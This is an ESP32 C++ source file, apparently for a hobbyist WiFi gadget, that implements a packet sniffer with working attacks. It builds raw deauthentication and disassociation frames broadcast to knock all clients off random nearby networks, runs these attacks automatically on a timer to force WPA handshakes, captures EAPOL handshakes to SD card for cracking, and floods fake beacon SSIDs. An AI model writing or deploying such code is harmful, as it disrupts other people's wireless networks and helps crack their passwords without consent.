/**
 * ╔═══════════════════════════════════════════════════════════════╗
 * ║                  PACKET SNIFFER SYSTEM                        ║
 * ║   Handles WiFi promiscuous mode, beacons, and deauths         ║
 * ║                                                               ║
 * ║                     by Alex R.                                ║
 * ╚═══════════════════════════════════════════════════════════════╝
 */
#include "PacketSniffer.h"

extern "C" {
  // Low-level ESP32 WiFi function for raw packet transmission
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_seq_net);
}

PacketSniffer *globalSniffer = NULL;

PacketSniffer::PacketSniffer() {
    sdManager = NULL;
    currentChannel = 1;
    lastChannelHop = 0;
    lastAttack = 0;
    isRunning = false;
    techLevel = 1;
    handshakeDetected = false;
    deauthDetected = false;
    packetCount = 0;
    deauthCount = 0;
    beaconCount = 0;
    handshakeCount = 0;
    probeCount = 0;
    networkCount = 0;
    probeCount_arr = 0;
    probeCount_arr = 0;
    pendingEvent = EVT_NONE;
    attackMode = false;
    attackStart = 0;
    attackType = 0;
}

void PacketSniffer::setTechLevel(int level) {
    techLevel = level;
}

void PacketSniffer::sendDeauth(uint8_t* bssid, uint8_t* client) {
    // 802.11 Deauth/Disassoc frame (24 byte header + 2 byte reason)
    uint8_t packet[26];
    memset(packet, 0, 26);

    // Common header for management frames
    // Duration will be 0x0000
    // Sequence number will be 0x0000 (ESP will overwrite if sequence control is enabled)
    
    // Address 1: Destination (Target client)
    memcpy(&packet[4], client, 6);
    // Address 2: Source (Access point / BSSID)
    memcpy(&packet[10], bssid, 6);
    // Address 3: BSSID
    memcpy(&packet[16], bssid, 6);

    // Reason codes to rotate: 
    // 1: Unspecified
    // 4: Inactivity 
    // 8: Station leaving
    static uint16_t reasonCodes[] = { 1, 4, 8 };
    static int rcIdx = 0;
    uint16_t reason = reasonCodes[rcIdx];
    rcIdx = (rcIdx + 1) % 3;
    packet[24] = reason & 0xFF;
    packet[25] = (reason >> 8) & 0xFF;

    // Send multiple times on current channel
    for(int i=0; i<3; i++) {
        // Deauth
        packet[0] = 0xC0; // Subtype 1100 (Deauth)
        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
        
        // Disassoc
        packet[0] = 0xA0; // Subtype 1010 (Disassoc)
        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
        
        delay(1);
    }
}

void PacketSniffer::deauthAttack() {
    if (networkCount == 0) return;
    attackMode = true;
    
    // Target a random known network for disruption
    int target = random(0, networkCount);
    uint8_t broadcast[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    
    Serial.printf("[WIFI] Deauthing: %s\n", networks[target].ssid);
    
    // Switch to target channel
    esp_wifi_set_channel(networks[target].channel, WIFI_SECOND_CHAN_NONE);
    
    // Send to broadcast address (kick everyone)
    sendDeauth(networks[target].bssid, broadcast);
}

void PacketSniffer::init(SDManager *sd) {
    sdManager = sd;
    globalSniffer = this;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(false);
    
    // Clear network list
    memset(networks, 0, sizeof(networks));
    memset(probes, 0, sizeof(probes));
}

void PacketSniffer::start() {
    if (isRunning) return;
    
    esp_wifi_set_promiscuous_rx_cb(&PacketSniffer::wifi_promiscuous_rx_cb);
    esp_wifi_set_promiscuous(true);
    isRunning = true;
    Serial.println("[Sniffer] Started");
}

void PacketSniffer::stop() {
    esp_wifi_set_promiscuous(false);
    isRunning = false;
    Serial.println("[Sniffer] Stopped");
}

// === BEACON ATTACKS ===

void PacketSniffer::stopAttack() {
    attackMode = false;
    attackType = 0;
}

void PacketSniffer::beaconSpam() {
    attackMode = true;
    attackType = 1; // Random/Common SSIDs
    attackStart = millis();
}

void PacketSniffer::rickRoll() {
    attackMode = true;
    attackType = 2; // Lyrics
    attackStart = millis();
}

// Raw Beacon Frame 
void PacketSniffer::broadcastBeacon(const char* ssid) {
    uint8_t epoch = 0;
    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
                /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
                /*22*/  0xc0, 0x6c, 
                /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
                /*32*/  0x64, 0x00, // Intervals
                /*34*/  0x01, 0x04, // Capabilities
                /*36*/  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72 // Dummy SSID
                };

    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    packet[37] = ssidLen;
    memcpy(&packet[38], ssid, ssidLen);

    // Channel (Tag 3)
    packet[38 + ssidLen] = 0x03;
    packet[39 + ssidLen] = 0x01;
    packet[40 + ssidLen] = currentChannel;

    // Send
    esp_wifi_80211_tx(WIFI_IF_STA, packet, 41 + ssidLen, false);
}

void PacketSniffer::loop() {
    if (!isRunning) return;
    
    unsigned long now = millis();

    // ATTACK LOOP
    if (attackMode) {
        // Auto-stop
        if (now - attackStart > 15000) {
            stopAttack();
        } else {
            // Rapid fire beacons
            if (attackType == 1) { // Random / Funny SSIDs
                 // Channel Hop (for visibility)
                 currentChannel = random(1, 14);
                 esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                 
                 const char* names[] = {
                     "FREE WIFI", "Loading...", "Virus.exe", "FBI Van 4", 
                     "Skynet", "Connect for Beer", "Tell My WiFi Love Her", 
                     "Drop It Like Its Hotspot", "No Internet", "Yell Penis for PW"
                 };
                 broadcastBeacon(names[random(0, 10)]);
                 delay(10); // Throttle slightly
            } 
            else if (attackType == 2) { // Rick Roll
                const char* lyrics[] = {
                    "01_Never_Gonna", "02_Give_You_Up", "03_Never_Gonna", 
                    "04_Let_You_Down", "05_Never_Gonna", "06_Run_Around", 
                    "07_And_Desert_You"
                };
                
                // Set disparate channel for burst
                currentChannel = random(1, 14);
                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                
                // Broadcast all lines rapidly
                for (int i=0; i<7; i++) {
                    broadcastBeacon(lyrics[i]);
                    delay(5);
                }
            }
        }
        return; // Skip sniffing while attacking
    }

    // Channel hopping (Unlocked at Level 4)
    if (techLevel >= 4) {
        if (now - lastChannelHop > 200) {
            lastChannelHop = now;
            currentChannel++;
            if (currentChannel > 13) currentChannel = 1;
            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        }
    }

    // Active Attack / Hungry Mode (Unlocked at Level 10)
    // If we haven't seen a handshake recently, try to force one
    if (techLevel >= 10 && networkCount > 0) {
        if (now - lastAttack > 15000) { // Cooldown 15s
            // Only attack if we are "hungry" (no handshake detected recently)
            // Or just do it anyway occasionally to be a "poltergeist"

            // Pick a random network
            int idx = random(0, networkCount);

            // Only attack if it's on our current channel
            if (networks[idx].channel == currentChannel) {
                uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

                sendDeauth(networks[idx].bssid, broadcast);

                lastAttack = now;
                pendingEvent = EVT_ATTACK;
                eventDetails = "ZAP! " + String(networks[idx].ssid);

                Serial.print("Attacked: ");
                Serial.println(networks[idx].ssid);
            }
        }
    }
}

// Event system
CaptureEvent PacketSniffer::getNextEvent() {
    CaptureEvent evt = pendingEvent;
    pendingEvent = EVT_NONE;
    return evt;
}

String PacketSniffer::getEventDetails() {
    return eventDetails;
}

int PacketSniffer::getNetworkCount() {
    return networkCount;
}

NetworkInfo* PacketSniffer::getNetwork(int idx) {
    if (idx < 0 || idx >= networkCount) return NULL;
    return &networks[idx];
}

// Legacy compatibility
bool PacketSniffer::hasHandshake() { return handshakeDetected; }
void PacketSniffer::clearHandshake() { handshakeDetected = false; }
bool PacketSniffer::hasDeauth() { return deauthDetected; }
void PacketSniffer::clearDeauth() { deauthDetected = false; }

// Find network by BSSID
int PacketSniffer::findNetwork(uint8_t* bssid) {
    for (int i = 0; i < networkCount; i++) {
        if (memcmp(networks[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

// Add new network
int PacketSniffer::addNetwork(uint8_t* bssid, char* ssid, int8_t rssi, uint8_t ch) {
    if (networkCount >= MAX_NETWORKS) return -1;
    
    int idx = networkCount++;
    memcpy(networks[idx].bssid, bssid, 6);
    strncpy(networks[idx].ssid, ssid, 32);
    networks[idx].ssid[32] = '\0';
    networks[idx].rssi = rssi;
    networks[idx].channel = ch;
    networks[idx].hasHandshake = false;
    
    return idx;
}

// Parse beacon frame
void PacketSniffer::parseBeacon(uint8_t* packet, uint16_t len) {
    if (len < 38) return;
    
    uint8_t* bssid = &packet[16];  // BSSID at offset 16
    uint8_t* ssidTag = &packet[36]; // SSID tag starts at 36
    
    char ssid[33] = {0};
    if (ssidTag[0] == 0) { // Tag type 0 = SSID
        uint8_t ssidLen = ssidTag[1];
        if (ssidLen > 32) ssidLen = 32;
        memcpy(ssid, &ssidTag[2], ssidLen);
    }
    
    // Check if already known
    int idx = findNetwork(bssid);
    if (idx == -1) {
        // New network!
        addNetwork(bssid, ssid, -50, currentChannel);
        pendingEvent = EVT_NEW_NETWORK;
        eventDetails = String(ssid);
        Serial.print("[WiFi] New: ");
        Serial.println(ssid);
    }
}

// Parse probe request
void PacketSniffer::parseProbe(uint8_t* packet, uint16_t len) {
    if (len < 26) return;
    
    uint8_t* srcMac = &packet[10];
    uint8_t* ssidTag = &packet[24];
    
    char ssid[33] = {0};
    if (ssidTag[0] == 0 && ssidTag[1] > 0) {
        uint8_t ssidLen = ssidTag[1];
        if (ssidLen > 32) ssidLen = 32;
        memcpy(ssid, &ssidTag[2], ssidLen);
    }
    
    if (strlen(ssid) > 0) {
        probeCount++;
        pendingEvent = EVT_PROBE;
        eventDetails = String(ssid);
    }
}

// Static callback
void PacketSniffer::wifi_promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (globalSniffer) {
        wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
        globalSniffer->processPacket(pkt->payload, pkt->rx_ctrl.sig_len);
    }
}

// Main packet processor
void PacketSniffer::processPacket(uint8_t *packet, uint16_t len) {
    packetCount++;
    if (len < 10) return;
    
    uint8_t frameControl = packet[0];
    uint8_t type = (frameControl >> 2) & 0x03;
    uint8_t subtype = (frameControl >> 4) & 0x0F;
    
    bool savePacket = false;
    
    // MANAGEMENT FRAMES (Type 0)
    if (type == 0) {
        switch (subtype) {
            case 4:  // Probe Request
                parseProbe(packet, len);
                break;
                
            case 8:  // Beacon
                beaconCount++;
                parseBeacon(packet, len);
                break;
                
            case 12: // Deauthentication
                deauthCount++;
                deauthDetected = true;
                pendingEvent = EVT_DEAUTH;
                eventDetails = "DEAUTH ATTACK";
                savePacket = true;
                break;
        }
    }
    
    // DATA FRAMES (Type 2) - EAPOL Detection
    else if (type == 2) {
        // Performance: Use O(1) offset calculation instead of linear scan
        // Skip encrypted frames (Protected bit 6 of byte 1)
        if (packet[1] & 0x40) return;

        // Calculate header length
        int offset = 24;

        // Address 4: ToDS=1 and FromDS=1 (bits 0 and 1 of byte 1)
        if ((packet[1] & 0x03) == 0x03) offset += 6;

        // QoS Control: Subtype bit 3 (e.g. 1000-1111)
        if (subtype & 0x08) offset += 2;

        // HT Control: Order bit (bit 7 of byte 1)
        if (packet[1] & 0x80) offset += 4;

        // Check for LLC/SNAP header (8 bytes) + EAPOL EtherType (0x888E at +6)
        if (len >= offset + 8) {
            if (packet[offset + 6] == 0x88 && packet[offset + 7] == 0x8E) {
                handshakeCount++;
                handshakeDetected = true;
                pendingEvent = EVT_HANDSHAKE;
                eventDetails = "WPA HANDSHAKE";
                savePacket = true;
                
                // Mark network as having handshake
                uint8_t* bssid = &packet[16];
                int idx = findNetwork(bssid);
                if (idx >= 0) {
                    networks[idx].hasHandshake = true;
                }
            }
        }
    }
    
    // Save important packets
    if (savePacket && sdManager) {
        sdManager->addPacket(packet, len);
    }
}
